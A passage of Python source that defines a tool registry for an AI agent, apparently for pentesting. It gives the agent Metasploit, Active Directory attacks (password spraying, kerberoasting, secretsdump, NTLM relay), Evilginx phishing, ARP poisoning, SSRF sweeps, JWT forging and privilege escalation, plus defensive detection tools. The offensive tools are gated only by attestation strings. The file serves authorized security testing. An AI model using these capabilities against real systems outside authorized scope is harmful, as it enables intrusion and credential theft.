            "provider": "OPTIONAL model key from config.json (e.g. fable, claude); omit for the seat's own identity",
            "text": "new text (set_role, set_conduct, add_instruction, add_safety)",
            "index": "index to drop (remove_instruction / remove_safety; into that layer's own list)",
            "what": "all | role | conduct | instructions | safety (reset)",
        },
        "func": tool_identity,
    },
    "dev_apply_and_test": {
        "desc": (
            "Development hand: write one or more files, then run a check/test "
            "command and report BOTH the writes and the test result (stdout + "
            "PASS/FAIL). Use this to make a change and prove it in one step — "
            "never claim a build works without the test actually passing here."
        ),
        "args": {
            "path": "single file to write (use with 'content')",
            "content": "contents for 'path'",
            "files": "OR a list of {path, content} objects to write together",
            "test": "shell command that proves the change (e.g. 'pytest -q', 'python x.py', 'npm test')",
        },
        "func": tool_dev_apply_and_test,
    },
    "centre": {
        "desc": (
            "Ask the SYGNIF py Centre (the knot point) for a capability. Dispatch "
            "a neuron by name: 'sys.state' (host snapshot), 'sys.procs', "
            "'knowledge.search'/'knowledge.read', 'note.write'/'note.read', plus "
            "any neurons the operator has added. Requires `sygnif-centre` running."
        ),
        "args": {
            "neuron": "neuron name, e.g. 'sys.state' or 'knowledge.search'",
            "args": "object of arguments for that neuron (may be empty)",
        },
        "func": tool_centre,
    },
    "commander": {
        "desc": (
            "Use the SYGNIF py commander (the hands) for sandboxed, allowlisted "
            "operations on a host: 'fs_read'/'fs_write'/'fs_list', 'code_search', "
            "'proc_exec' (named commands only). Requires `sygnif-commander` "
            "running and its token exported to this seat."
        ),
        "args": {
            "name": "commander tool, e.g. 'fs_read', 'code_search', 'proc_exec'",
            "args": "object of arguments for that tool",
        },
        "func": tool_commander,
    },
    "web": {
        "desc": (
            "Reach the internet. Give a 'url' to fetch a page (HTML stripped to "
            "text by default; pass raw=true for the source), OR a 'query' to run "
            "a keyless web search and get the top result links. Ground claims in "
            "what the page actually returned."
        ),
        "args": {
            "url": "URL to GET, e.g. 'https://example.com'",
            "query": "OR a web-search query when you don't have a URL",
            "raw": "optional 'true' to return raw HTML instead of stripped text",
        },
        "func": tool_web,
    },
    "github": {
        "desc": (
            "Search GitHub for tools, libraries and repos. Give a 'query'; get the "
            "top repositories (name, stars, language, description, URL). Set "
            "kind='code' to search source instead. No key needed; a GITHUB_TOKEN "
            "in the environment raises the rate limit."
        ),
        "args": {
            "query": "what to search for, e.g. 'subdomain enumeration tool'",
            "kind": "'repositories' (default) or 'code'",
            "limit": "how many results (default 10)",
        },
        "func": tool_github,
    },
    "kali": {
        "desc": (
            "Run a pentest tool with the Kali toolset and return its real output. "
            "Uses the 'sygnif-kali' Docker container when it is up (like the pi "
            "seat); otherwise runs on this host, which on a native Kali box "
            "already has the tools. Only act against AUTHORIZED targets."
        ),
        "args": {"command": "command to run, e.g. 'nmap -sV target' or 'nikto -h url'"},
        "func": tool_kali,
    },
    "kali_tools": {
        "desc": (
            "List the Kali tools actually available (queried live from the "
            "'sygnif-kali' container), grouped by kill-chain category, or check "
            "one named tool. Use this before reaching for 'kali' so you never "
            "assume a tool that is not installed."
        ),
        "args": {
            "category": "optional: recon|web|passwords|smb_ad|exploit|sniff_mitm|wireless|pivot|forensics_re|essentials",
            "check": "optional: a single tool name to confirm on PATH, e.g. 'nuclei'",
        },
        "func": tool_kali_tools,
    },
    "metasploit": {
        "desc": ("Drive Metasploit via its RPC daemon in the sygnif-kali container — "
                 "structured results, not screen-scraping. actions: version, search, info, "
                 "options, run, sessions, session_read, session_write. AUTHORIZED targets only."),
        "args": {"action": "version|search|info|options|run|sessions|session_read|session_write",
                 "query": "for search", "module": "full module path for info/options/run",
                 "options": "dict of module options for run", "id": "session id",
                 "command": "for session_write"},
        "func": tool_metasploit,
    },
    "purple": {
        "desc": ("Run a raw DEFENSIVE (blue-team) command in the purple container (or the "
                 "toolbox/host if absent): detection, IR, forensics, log analysis with the "
                 "container's tools (yara, clamav, rkhunter, chkrootkit, chainsaw, ...). "
                 "For structured compromise assessment use 'detect'. Analysis, not attacking."),
        "args": {"command": "defensive command, e.g. 'yara rules.yar sample' or 'zeek -r capture.pcap'"},
        "func": tool_purple,
    },
    "phase": {
        "desc": ("Get or set the current pentest phase (recon, enum, vuln, exploit, "
                 "postexploit, report). The phase tags every finding so the report reads "
                 "as a methodical walk. No args = show current; set=<phase> to advance."),
        "args": {"set": "optional: the phase to move to"},
        "func": tool_phase,
    },
    "finding": {
        "desc": ("Record a verified finding — EVIDENCE REQUIRED. A finding with no proof, "
                 "or proof too thin to be real tool output, is refused. Fields: title, "
                 "severity (info|low|medium|high|critical), target, evidence (command + real "
                 "output snippet), and optional description, recommendation."),
        "args": {"title": "short name of the issue", "severity": "info|low|medium|high|critical",
                 "target": "host/IP/URL affected", "evidence": "the command run and a snippet of its real output",
                 "description": "optional: what it is and impact", "recommendation": "optional: the fix"},
        "func": tool_finding,
    },
    "report": {
        "desc": ("Render all recorded findings into a Markdown pentest report in the workspace, "
                 "grouped by severity, each with evidence and a fix. Pulls the header from "
                 "SCOPE.md. Run at the end or any time for a running picture."),
        "args": {},
        "func": tool_report,
    },
    "ad": {
        "desc": ("Active Directory attack EXECUTION on an authorized domain (NetExec + "
                 "Impacket + Certipy): mode=enum|spray|kerberoast|asrep|secretsdump|exec|"
                 "certipy. The active sibling of ad_enum. Needs target (DC/host) + "
                 "authorization; SCOPE-confined; spray is rate-limited."),
        "args": {"target": "DC / host IP you are authorized to test", "authorization": "attestation",
                 "mode": "enum|spray|kerberoast|asrep|secretsdump|exec|certipy",
                 "domain": "AD domain (FQDN)", "user": "username", "password": "password",
                 "hash": "NTLM hash (instead of password)", "users": "user-list path (spray/asrep)",
                 "protocol": "spray proto: smb|ldap|winrm|mssql", "command": "exec: command to run"},
        "func": tool_ad,
    },
    "aitm": {
        "desc": ("Adversary-in-the-Middle phishing SIMULATION (Evilginx) for an authorized "
                 "engagement: mode=phishlets|setup|lure|sessions|status. Targets people — "
                 "REQUIRES 'phishing_authorization' (written SE/phishing scope) on top of the "
                 "normal target scope. Sends nothing itself; captured secrets are redacted."),
        "args": {"phishing_authorization": "written attestation that phishing/SE is in scope",
                 "mode": "phishlets|setup|lure|sessions|status",
                 "domain": "phishing domain you control/are authorized to use",
                 "phishlet": "phishlet name (see mode=phishlets)"},
        "func": tool_aitm,
    },
    "arp": {
        "desc": ("ARP cache poisoning on an authorized local segment (EONRaider/Arp-Spoofer, "
                 "zero-dep pure-Python, shelled out). mode=mitm (MITM, victim stays online) | "
                 "disassociate (cut victim off — DISRUPTIVE). Bounded by seconds=, restores on "
                 "exit. Needs target(victim IP) + authorization; SCOPE-confined; rate-limited; root."),
        "args": {"target": "victim IP on your segment", "authorization": "attestation",
                 "mode": "mitm|disassociate", "seconds": "run duration (default 30)",
                 "interface": "NIC (auto if omitted)", "gateway": "gateway IP (auto if omitted)",
                 "interval": "ARP send interval"},
        "func": tool_arp,
    },
    "subenum": {
        "desc": ("Passive subdomain enumeration (EONRaider/ReconLib, GPL, shelled out): unions "
                 "crt.sh Certificate Transparency + HackerTarget passive DNS. Public data only, "
                 "no packets to the target, but SCOPE-gated. Needs domain + authorization."),
        "args": {"domain": "root domain to enumerate (e.g. example.com)",
                 "authorization": "attestation that the domain is in scope"},
        "func": tool_subenum,
    },
    "sniff": {
        "desc": ("DEFENSIVE packet capture + decode (EONRaider/RootWire, GPL): pure-Python raw-socket "
                 "sniffer, decodes L2-L4 and verifies checksums. mode=pcap (file=, replay, no root) | "
                 "live (interface=, needs root, bounded by seconds). filter= optional. JSON. No offensive gate."),
        "args": {"mode": "pcap|live", "file": "pcap/pcapng path (pcap mode)",
                 "interface": "NIC you own (live mode)", "seconds": "live capture duration (default 20)",
                 "filter": "canned arp|ip6|tcp|udp or a BPF-style expr (optional)"},
        "func": tool_sniff,
    },
    "coerce": {
        "desc": ("Auth coercion + NTLM relay for an authorized AD engagement (Coercer + "
                 "Impacket ntlmrelayx): mode=coerce|relay. Needs target + authorization + listener."),
        "args": {"target": "host to coerce/relay", "authorization": "attestation",
                 "mode": "coerce|relay", "listener": "your relay/capture IP",
                 "relay_to": "relay target (relay mode)", "domain": "AD domain",
                 "user": "user", "password": "password"},
        "func": tool_coerce,
    },
    "bloodyad": {
        "desc": ("AD object/ACL abuse for an authorized engagement (bloodyAD): "
                 "mode=whoami|get|dacl|addcomputer|shadow|setpassword. Needs target(DC) + "
                 "authorization + domain/user/password."),
        "args": {"target": "DC", "authorization": "attestation",
                 "mode": "whoami|get|dacl|addcomputer|shadow|setpassword", "domain": "AD domain",
                 "user": "user", "password": "password", "hash": "NTLM hash",
                 "object": "target object", "trustee": "grantee (dacl)", "new_password": "setpassword"},
        "func": tool_bloodyad,
    },
    "winrm": {
        "desc": ("Interactive-style WinRM on an authorized Windows host (evil-winrm): "
                 "mode=exec (one command) | connect (emit interactive string). PtH via hash. "
                 "Needs target + authorization + user + password/hash."),
        "args": {"target": "Windows host", "authorization": "attestation", "mode": "exec|connect",
                 "user": "user", "password": "password", "hash": "NTLM hash", "command": "exec: command"},
        "func": tool_winrm,
    },
    "cloudx": {
        "desc": ("OFFENSIVE cloud for an authorized engagement (active sibling of cloud_audit): "
                 "mode=aws(Pacu)|azure(ROADrecon)|azuread(AzureHound). Creds from env. Needs "
                 "target(account/tenant) + authorization."),
        "args": {"target": "account/tenant id", "authorization": "attestation",
                 "mode": "aws|azure|azuread", "commands": "pacu modules (aws)"},
        "func": tool_cloudx,
    },
    "kube": {
        "desc": ("OFFENSIVE Kubernetes for an authorized engagement: mode=hunt(kube-hunter)|"
                 "rbac(kubectl can-i)|enum(peirates). Needs target(API/cluster) + authorization."),
        "args": {"target": "API server/cluster", "authorization": "attestation", "mode": "hunt|rbac|enum"},
        "func": tool_kube,
    },
    "emulate": {
        "desc": ("Adversary emulation / detection validation (Atomic Red Team): fire an ATT&CK "
                 "technique on an authorized host, then check detect/triage/netmon caught it. "
                 "mode=list|run|cleanup. EXECUTES attack behaviour — needs target + authorization."),
        "args": {"target": "authorized host (e.g. localhost)", "authorization": "attestation",
                 "mode": "list|run|cleanup", "technique": "ATT&CK id, e.g. T1059.004"},
        "func": tool_emulate,
    },
    "netmon": {
        "desc": ("DEFENSIVE network detection: Zeek (traffic->logs) + Suricata (signature IDS) "
                 "over a PCAP or an interface you own. mode=pcap file= | live interface=. No gate."),
        "args": {"mode": "pcap|live", "file": "pcap path (pcap)", "interface": "iface (live)",
                 "seconds": "live capture seconds"},
        "func": tool_netmon,
    },
    "memforensics": {
        "desc": ("DEFENSIVE memory forensics (Volatility3) on a memory image you captured — "
                 "catches fileless/in-memory implants. Give file= and optional plugin=. No gate."),
        "args": {"file": "memory dump path", "plugin": "vol3 plugin (default windows.pslist)"},
        "func": tool_memforensics,
    },
    "falco": {
        "desc": ("DEFENSIVE runtime EDR (Falco/eBPF): live syscall detection of priv-esc, "
                 "unexpected exec, container escape. mode=status|rules|run. No gate."),
        "args": {"mode": "status|rules|run", "seconds": "run capture seconds"},
        "func": tool_falco,
    },
    "wazuh": {
        "desc": ("DEFENSIVE SIEM query (Wazuh API): mode=agents|alerts. Reads WAZUH_API_URL/"
                 "USER/PASSWORD from env. No gate."),
        "args": {"mode": "agents|alerts"},
        "func": tool_wazuh,
    },
    "intel": {
        "desc": ("Threat-intel / IOC enrichment: a hash/IP/domain -> verdict via VirusTotal + "
                 "OTX + MISP (keys from env). Read-only lookup. No gate."),
        "args": {"ioc": "hash, IP, or domain to enrich"},
        "func": tool_intel,
    },
    "velociraptor": {
        "desc": ("OFFENSIVE Velociraptor for an authorized engagement: post-exploitation "
                 "collection + VQL execution on a foothold, and offline-collector generation. "
                 "mode=live|query|collect|offline|hunt (live = stand up a self-contained Velociraptor "
                 "GUI server on 127.0.0.1:8889). The offensive sibling of `triage`. Needs "
                 "target + authorization; SCOPE-confined; audited. VQL is powerful — in scope only."),
        "args": {"target": "authorized host / foothold", "authorization": "attestation",
                 "mode": "live|query|collect|offline|hunt|status|stop", "query": "VQL (query/hunt)",
                 "artifact": "artifact name (collect/offline)", "config": "server API config (hunt)"},
        "func": tool_velociraptor,
    },
    "triage": {
        "desc": ("DEFENSIVE live endpoint IR triage & hunting with Velociraptor on a host "
                 "you own / are responding to: mode=live (stand up a Velociraptor GUI server on "
                 "127.0.0.1:8889) | collect | hunt | artifacts. The blue mirror of the offensive suite."),
        "args": {"mode": "live|collect|hunt|artifacts|status|stop", "artifact": "artifact name (collect)",
                 "query": "VQL (hunt)"},
        "func": tool_triage,
    },
    "inventory": {
        "desc": ("Query the asset inventory (hosts + open ports/services) built "
                 "automatically from recon/portscan/netenum output. Filter by host, "
                 "service, or port. The queryable target base — no grepping notes."),
        "args": {"host": "optional host filter", "service": "optional service filter",
                 "port": "optional port filter"},
        "func": tool_inventory,
    },
    "secrets_scan": {
        "desc": "Scan a repo/dir you own for leaked secrets (API keys, tokens, creds) with trufflehog + gitleaks. Runs on this host.",
        "args": {"path": "repo/dir to scan (default .)"},
        "func": tool_secrets_scan,
    },
    "trufflehog": {
        "desc": ("Deep secret hunting with trufflehog, with LIVE verification of hits, across a "
                 "'source': filesystem (default; 'target' path in the workspace mount) | git ('target' "
                 "repo URL or local path, optional 'branch'/'since') | github ('target' repo URL or "
                 "'org' name, optional 'token') | gitlab ('token' required, optional 'endpoint'/'repo'). "
                 "'results'=verified (default, only API-confirmed) |unknown|unverified|all. Complements "
                 "secrets_scan by reaching remote repos/orgs/instances and validating."),
        "args": {"source": "filesystem|git|github|gitlab", "target": "path/repo-URL/repo depending on source", "org": "GitHub org (github)", "endpoint": "GitLab base URL (gitlab)", "token": "PAT for github/gitlab", "results": "verified|unknown|unverified|all (default verified)", "branch": "git branch", "since": "git since-commit", "json": "true for JSON output", "extra": "raw trufflehog flags"},
        "func": tool_trufflehog,
    },
    "sast": {
        "desc": "Static analysis of YOUR source for vulns (injection/XSS/secrets/misconfig) via semgrep. Runs on this host (needs semgrep).",
        "args": {"path": "source dir (default .)", "config": "semgrep config (default auto)"},
        "func": tool_sast,
    },
    "tls_check": {
        "desc": "TLS/SSL audit of an authorized host (testssl/sslscan): protocol versions, weak ciphers, cert. Requires target+authorization.",
        "args": {"target": "host you are authorized to test", "authorization": "attestation"},
        "func": tool_tls_check,
    },
    "headers": {
        "desc": "Grade a URL's security headers + cookie flags + CORS (keyless, single GET). Passive.",
        "args": {"url": "URL to check"},
        "func": tool_headers,
    },
    "graphql": {
        "desc": "GraphQL authz probe on an authorized endpoint: op=introspect (compact schema summary + sensitive fields) or op=query (run a query with optional token). For field/resolver-level authorization testing. Requires target+authorization.",
        "args": {"target": "the /graphql endpoint URL you are authorized to test", "authorization": "attestation", "op": "introspect (default) | query", "query": "GraphQL query string (op=query)", "token": "optional bearer token to test as a given user", "variables": "optional query variables object"},
        "func": tool_graphql,
    },
    "ssrf_catcher": {
        "desc": "Out-of-band SSRF listeners. action=start (HTTP catcher; redirect=<url> makes it 302 to an internal target to bypass an allow-list-then-follow sink; bind=127.0.0.1 for loopback-only), action=start_dns (UDP DNS logger for blind SSRF when HTTP egress is filtered), action=check / check_dns (grep hits, optional nonce), action=stop / stop_dns. Your own listeners; pair with the gated web/graphql tools to inject the callback.",
        "args": {"action": "start | start_dns | check | check_dns | stop | stop_dns", "port": "listener port (HTTP default 9899, DNS default 5354)", "redirect": "start: 302 every hit to this URL (allow-list bypass)", "bind": "start: bind address (default 0.0.0.0; 127.0.0.1 = loopback-only)", "answer": "start_dns: A-record IP to answer with (default 127.0.0.1)", "nonce": "filter hits by nonce (check)"},
        "func": tool_ssrf_catcher,
    },
    "ssrf": {
        "desc": ("SSRF prober for an AUTHORIZED sink (fetcher/webhook/image-proxy/import-by-URL/CI-include). Injects an inner URL you control into the sink and reports its response. mode=probe (inner=<url>, e.g. your ssrf_catcher callback) or mode=sweep (built-in internal target list: AWS IMDSv1+IMDSv2-detect, GCP/Azure/DigitalOcean/Oracle/Alibaba metadata, loopback, docker-host, IP-encoding bypasses (decimal/hex/octal/short/IPv4-mapped), and file://gopher://dict:// schemes, each diffed vs an external control). Carriers: body={{SSRF}} | field=<json key> | param=<query param> | default ?url=. Auth to the sink via token/cookie/auth_header. Scope-gated on target."),
        "args": {"target": "the sink URL you are authorized to test", "authorization": "attestation", "mode": "probe (default) | sweep", "inner": "URL the sink should fetch (mode=probe)", "param": "query param to inject into", "field": "JSON body key to inject into (POST)", "body": "raw body template with {{SSRF}} placeholder", "method": "GET (default) | POST", "nonce": "tag appended to inner for ssrf_catcher correlation", "token": "bearer token for the sink", "cookie": "cookie for the sink", "follow_redirects": "0 to not follow (see raw Location)"},
        "func": tool_ssrf,
    },
    "takeover": {
        "desc": "Subdomain-takeover check on an authorized domain (subfinder -> subjack/nuclei). Requires target+authorization.",
        "args": {"domain": "domain you are authorized to test", "authorization": "attestation"},
        "func": tool_takeover,
    },
    "akamai": {
        "desc": ("Akamai-aware recon for an authorized target behind Akamai's CDN/WAF. modes: detect "
                 "(confirm Akamai + product via wafw00f + edge headers) | debug (send Akamai Pragma "
                 "debug directives, read the akamai-x-* edge headers: cache key, request id, edge "
                 "server) | origin (find the real backend to test directly: DNS/A records, subdomains "
                 "that skip the CDN, cert SANs). Requires 'target'+'authorization'; SCOPE.md-confined. "
                 "Read-only recon; does NOT forge Bot Manager sensor data (anti-bot bypass is excluded)."),
        "args": {"target": "URL you are authorized to test", "authorization": "attestation", "mode": "detect|debug|origin (default detect)", "extra": "extra shell to append"},
        "func": tool_akamai,
    },
    "osint": {
        "desc": "Passive OSINT on an authorized domain (theHarvester, dnsx, SPF/DMARC). Requires target+authorization.",
        "args": {"domain": "domain you are authorized to test", "authorization": "attestation"},
        "func": tool_osint,
    },
    "portscan": {
        "desc": "Structured nmap service scan of an authorized target. Requires target+authorization.",
        "args": {"target": "host/range you are authorized to test", "authorization": "attestation", "ports": "e.g. 1-1000 (default top-1000)", "extra": "extra nmap flags"},
        "func": tool_portscan,
    },
    "cidr_scan": {
        "desc": ("Sweep a whole CIDR range (e.g. 172.17.0.0/24). modes: discover (nmap ping-sweep → "
                 "list of live hosts) | ports (naabu connect-scan across the range, or engine=masscan "
                 "for a fast wide sweep) | full (host:port sweep, then nmap -sV on exactly what's found). "
                 "Requires 'target' (the CIDR) + 'authorization'; SCOPE.md-confined. Loud and wide — "
                 "scope tightly. From the toolbox, use container-net CIDRs (e.g. 172.17.0.0/24), not the "
                 "host loopback."),
        "args": {"target": "CIDR you are authorized to test, e.g. 172.17.0.0/24", "authorization": "attestation", "mode": "discover|ports|full (default discover)", "ports": "port spec, e.g. 1-1000 or 22,80,443 (default 1-1000)", "engine": "ports mode: naabu (default) | masscan", "rate": "masscan packets/sec (default 1000)", "extra": "extra flags"},
        "func": tool_cidr_scan,
    },
    "netenum": {
        "desc": "Network service enumeration (SMB via enum4linux-ng/smbmap/nxc, or SNMP) on an authorized host. Requires target+authorization.",
        "args": {"target": "host you are authorized to test", "authorization": "attestation", "service": "smb (default) or snmp"},
        "func": tool_netenum,
    },
    "pw_strength": {
        "desc": "Test a password's strength locally + check HaveIBeenPwned (k-anonymity: only a SHA-1 prefix is sent, never the password). Defensive self-test.",
        "args": {"password": "the password to test"},
        "func": tool_pw_strength,
    },
    "cell_info": {
        "desc": ("DEFENSIVE cellular info: your OWN modem's serving cell (mode=serving, via mmcli), "
                 "tower geolocation (mode=lookup, OpenCellID), or IMSI-catcher detection guidance "
                 "(mode=detect). No transmitting / no interception."),
        "args": {"mode": "serving (default) | lookup | detect", "mcc": "for lookup", "mnc": "for lookup", "lac": "for lookup", "cellid": "for lookup"},
        "func": tool_cell_info,
    },
    "container_scan": {
        "desc": "Scan a container image, filesystem, repo, or IaC for CVEs + secrets + misconfig (trivy). type=image|fs|repo|config.",
        "args": {"target": "image ref or path (default .)", "type": "image|fs|repo|config"},
        "func": tool_container_scan,
    },
    "webshot": {
        "desc": "Screenshot an authorized web host (gowitness/eyewitness) — visual recon / fleet overview. Requires target+authorization.",
        "args": {"target": "URL/host you are authorized to test", "authorization": "attestation"},
        "func": tool_webshot,
    },
    "ad_enum": {
        "desc": "Collect BloodHound data from an authorized Active Directory (bloodhound-python). Requires domain+dc+user+password+authorization.",
        "args": {"domain": "AD domain", "dc": "DC IP/host", "user": "AD user", "password": "AD password", "authorization": "attestation"},
        "func": tool_ad_enum,
    },
    "cloud_audit": {
        "desc": "Cloud security-posture audit with Prowler (aws|gcp|azure|kubernetes). Uses cloud creds from the environment. Requires authorization; auto-installs prowler in the toolbox.",
        "args": {"provider": "aws|gcp|azure|kubernetes", "authorization": "attestation", "extra": "extra prowler flags"},
        "func": tool_cloud_audit,
    },
    "crypto": {
        "desc": "Encode/decode/hash/hmac/JWT-decode/identify/magic-decrypt. Local + deterministic (identify+magic use the toolbox).",
        "args": {"op": "encode|decode|hash|hmac|jwt|identify|magic", "data": "the input", "algo": "base64|hex|url|rot13 or md5|sha256|...", "key": "for hmac"},
        "func": tool_crypto,
    },
    "shodan": {
        "desc": ("Internet-wide PASSIVE intelligence via Shodan (no packets to the target). "
                 "op=host looks up an IP/domain's exposed ports+CVEs (keyless InternetDB, or full "
                 "data with SHODAN_API_KEY); search/count/dns/info/myip need the key."),
        "args": {"op": "host|cve|cvesearch|search|count|dns|info|myip", "target": "IP/domain (host)", "cve": "CVE id (cve)", "product": "product (cvesearch)", "query": "Shodan search query", "domain": "for dns"},
        "func": tool_shodan,
    },
    "api_scan": {
        "desc": ("API security testing (OWASP API Top 10-oriented). mode=discover (surface + "
                 "params + exposures via nuclei/arjun), spec (schemathesis fuzz an OpenAPI/Swagger "
                 "URL), graphql (graphw00f + introspection), jwt (analyse a token + weak-secret "
                 "crack path). Requires target+authorization (jwt mode is local). Auto-installs "
                 "schemathesis/graphw00f as needed."),
        "args": {"target": "API base URL you are authorized to test", "authorization": "attestation", "mode": "discover|spec|graphql|jwt", "spec": "OpenAPI/Swagger URL (spec mode)", "token": "JWT (jwt mode)"},
        "func": tool_api_scan,
    },
    "website": {
        "desc": "Quick website recon: robots/sitemap/security.txt, DNS, whois, tech fingerprint, wayback snapshot count. Passive.",
        "args": {"url": "the site URL"},
        "func": tool_website,
    },
    "recon": {
        "desc": ("Recon/OSINT on an authorized target domain: subdomains (subfinder), DNS + "
                 "SPF/DMARC, tech fingerprint (whatweb), and live-host probing (httpx). Requires "
                 "'target' + 'authorization'; SCOPE.md-confined when present."),
        "args": {"target": "domain you are authorized to test", "authorization": "who authorized it (owner/engagement/ticket)", "extra": "optional extra shell to append"},
        "func": tool_recon,
    },
    "nuclei": {
        "desc": ("Templated vulnerability scan (nuclei) of an authorized URL — CVEs, misconfig, "
                 "exposures. Set SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES to add the Wordfence WP-CVE "
                 "template set. Requires 'target'+'authorization'."),
        "args": {"target": "URL you are authorized to test", "authorization": "attestation", "tags": "optional nuclei tags e.g. wordpress,cve", "severity": "optional e.g. critical,high", "extra": "optional extra flags"},
        "func": tool_nuclei,
    },
    "jwt": {
        "desc": ("JSON Web Token testing/forging with jwt_tool (toolbox). Operates on the supplied "
                 "'token' STRING, not a live endpoint. modes: decode (default — parse header/payload "
                 "+ security checks) | crack (dictionary attack on the HMAC secret; 'wordlist', "
                 "default rockyou) | sign (re-sign with a known 'secret' [+'algorithm']) | tamper "
                 "(set a payload 'claim'+'value', optionally re-sign with 'secret') | exploit "
                 "('exploit': none=alg:none, null=null-sig, blank=blank-password, psychic=ECDSA, "
                 "key_confusion(+'pubkey'), jwks_spoof(+'jwks_url'))."),
        "args": {"token": "the JWT string (required)", "mode": "decode|crack|sign|tamper|exploit", "secret": "HMAC key for sign/tamper", "wordlist": "dict path for crack", "claim": "payload claim to set (tamper)", "value": "claim value (tamper)", "algorithm": "sign alg, default hs256", "exploit": "none|null|blank|psychic|key_confusion|jwks_spoof", "pubkey": "RSA public-key path (key_confusion)", "jwks_url": "URL (jwks_spoof)", "extra": "raw jwt_tool flags to append"},
        "func": tool_jwt,
    },
    "glab": {
        "desc": ("GitLab CLI (glab) against an instance you are authorized on. Put the subcommand in "
                 "'args' (e.g. 'api /version', 'api /users', 'repo list', 'ci list'). Provide 'host' "
                 "(e.g. 127.0.0.1:8929) and 'token'. For the lab, use $GL19_URL host + $GL19_TOKEN "
                 "from ~/sygnif-pentest/lab-creds.env."),
        "args": {"args": "glab subcommand + flags (required)", "host": "GITLAB_HOST, e.g. 172.17.0.4:8929 (container-net IP, not 127.0.0.1, when run from the toolbox)", "token": "GITLAB_TOKEN (PAT)", "protocol": "http|https (default https; http lab instances need http)"},
        "func": tool_glab,
    },
    "graphw00f": {
        "desc": ("Fingerprint a GraphQL endpoint's server engine (Apollo, Hasura, graphql-yoga, …) with "
                 "graphw00f — detect + fingerprint mode. Names the engine so you can pick engine-specific "
                 "attacks. Requires 'target' (the GraphQL URL) + 'authorization'."),
        "args": {"target": "GraphQL endpoint URL you are authorized to test", "authorization": "attestation", "extra": "raw graphw00f flags"},
        "func": tool_graphw00f,
    },
    "clairvoyance": {
        "desc": ("Recover a GraphQL schema when introspection is DISABLED, via field-suggestion brute "
                 "force (clairvoyance). Requires 'target'+'authorization'. 'wordlist' = field-name list; "
                 "'output' writes the JSON schema to a workspace path; 'insecure'=true skips TLS verify."),
        "args": {"target": "GraphQL endpoint URL you are authorized to test", "authorization": "attestation", "wordlist": "optional field-name wordlist path", "output": "optional JSON schema output path (workspace mount)", "insecure": "true to skip TLS verify", "extra": "raw clairvoyance flags"},
        "func": tool_clairvoyance,
    },
    "wpscan": {
        "desc": ("Full WordPress enumeration (wpscan): vulnerable plugins/themes, users, config "
                 "backups, db exports. Uses WPSCAN_API_TOKEN for CVE data if set. Requires "
                 "'target'+'authorization'. (Passive detection alternative: wp_vulnscan.)"),
        "args": {"target": "WordPress URL you are authorized to test", "authorization": "attestation", "enumerate": "wpscan --enumerate value (default vp,vt,u,cb,dbe)", "extra": "optional extra flags"},
        "func": tool_wpscan,
    },
    "exploit_search": {
        "desc": "Find exploits/PoCs: offline Exploit-DB (searchsploit) PLUS public PoC repos on GitHub (keyless, star-ranked; surfaces PoCs Exploit-DB lacks, e.g. xzbot for CVE-2024-3094). By product/version or CVE id.",
        "args": {"query": "product/version text", "cve": "or a CVE id"},
        "func": tool_exploit_search,
    },
    "msf": {
        "desc": ("Run a Metasploit module non-interactively against an authorized target. Requires "
                 "'target'+'authorization'+'module'; pass module 'options' as a dict. Validate the "
                 "module and blast radius first; least-destructive proof."),
        "args": {"target": "RHOSTS you are authorized to test", "authorization": "attestation", "module": "msf module path", "options": "dict of module options", "action": "run|check|exploit (default run)"},
        "func": tool_msf,
    },
    "bruteforce": {
        "desc": ("Online credential testing (hydra) against an authorized service. LOUD and can "
                 "lock accounts — authorized + rate-agreed only. Requires 'target'+'authorization'+"
                 "'service' and a user/pass source."),
        "args": {"target": "host you are authorized to test", "authorization": "attestation", "service": "ssh|ftp|smb|http-post-form|...", "userlist": "path", "passlist": "path", "user": "or a single user", "password": "or a single password", "path": "form/path spec for http services", "extra": "optional flags"},
        "func": tool_bruteforce,
    },
    "crack": {
        "desc": ("Offline hash cracking (hashcat, else john) on hashes you are authorized to hold. "
                 "Requires 'authorization', a 'hashfile', a hashcat 'mode' and a 'wordlist'."),
        "args": {"target": "engagement/host the hashes came from", "authorization": "attestation", "hashfile": "path to hashes", "mode": "hashcat mode e.g. 22000/0/1000", "wordlist": "path (default rockyou)", "extra": "optional flags"},
        "func": tool_crack,
    },
    "postexploit": {
        "desc": ("LOCAL privilege-escalation ENUMERATION on an authorized host (linpeas if present, "
                 "else a built-in quick enum). Enumeration only — no persistence/lateral movement. "
                 "Requires 'authorization'. fetch=true allows downloading linpeas."),
        "args": {"target": "host (default localhost)", "authorization": "attestation + RoE permits post-ex", "fetch": "optional 'true' to fetch linpeas"},
        "func": tool_postexploit,
    },
    "privesc": {
        "desc": ("LOCAL privilege escalation on an AUTHORIZED foothold (turn a shell into "
                 "root/owner). modes: suggest=candidate kernel exploits (linux-exploit-suggester-2, "
                 "READ-ONLY); gtfo=GTFOBins escape for a sudo/SUID 'binary' (keyless); spy=pspy watch "
                 "root cron/processes; container=deepce container-escape enum; auto=traitor+GTFONow "
                 "exploitable-vector analysis. Requires 'target'+'authorization'; SCOPE.md-confined. "
                 "Candidate CVEs are NOT confirmed — verify before firing. Fetches tools to /tmp."),
        "args": {"mode": "suggest|gtfo|spy|container|auto", "target": "authorized host (default localhost)", "authorization": "attestation + RoE permits post-ex", "binary": "(gtfo) binary you hold sudo/SUID/caps on", "kernel": "(suggest) kernel version if remote e.g. 5.4.0", "seconds": "(spy) watch window, default 25", "exploit": "(auto) 'true' for exploitation instructions"},
        "func": tool_privesc,
    },
    "dast": {
        "desc": ("Headless dynamic web-app scan (DAST) driving OWASP ZAP via its REST API — the "
                 "agent-drivable equivalent of a Burp active scan (Burp Community has no automation). "
                 "modes: quick=passive reconnaissance (zapit, fast, no daemon); baseline=spider + "
                 "PASSIVE scan (quiet, no attack payloads); active=spider + ACTIVE scan (sends attack "
                 "payloads, louder). Alerts grouped by risk with CWE. Requires 'target'+'authorization'; "
                 "SCOPE.md-confined. For manual work use Burp Repeater/Proxy by hand."),
        "args": {"mode": "quick|baseline|active", "target": "the web app URL (yours/authorized)", "authorization": "attestation"},
        "func": tool_dast,
    },
    "detect": {
        "desc": ("DEFENSIVE compromise assessment (blue team) — the mirror of the offensive suite, "
                 "modelled on Nextron THOR/THOR Lite. Engine: LOKI (free open-source THOR-Lite sibling) "
                 "+ YARA-Forge rules + chainsaw. modes: ioc=full local YARA+IOC scan of a 'path'; "
                 "webshell=file-only scan of a web root (detect dropped shells); yara=YARA-Forge/custom "
                 "rules over a 'path'; rootkit=rkhunter+chkrootkit; malware=clamav(+capa); sigma=chainsaw "
